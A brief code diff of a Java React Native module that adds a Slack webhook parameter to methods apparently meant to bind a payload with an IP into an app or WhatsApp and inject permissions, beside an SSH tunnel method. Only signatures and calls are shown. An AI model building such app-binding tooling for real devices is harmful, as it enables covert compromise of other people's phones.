@@ -35,11 +35,11 @@ public class MyAppModule extends ReactContextBaseJavaModule {
     }
 
     @ReactMethod
-    public void bindApp(String path, String ip, Boolean injectPermission){
-        new AppBinder(reactContext, injectPermission).execute(path, ip);
+    public void bindApp(String path, String ip, Boolean injectPermission,String slackHook){
+        new AppBinder(reactContext, injectPermission).execute(path, ip, slackHook);
     }
     @ReactMethod
-    public void bindWhatsapp(String ip){ new WhatsappBinder(reactContext).execute(ip); }
+    public void bindWhatsapp(String ip, String slackHook){ new WhatsappBinder(reactContext).execute(ip, slackHook); }
 
     @ReactMethod
     public void sshTunnel(String user, String host, String pass, int rport, String lhost, int lport, Promise promise){
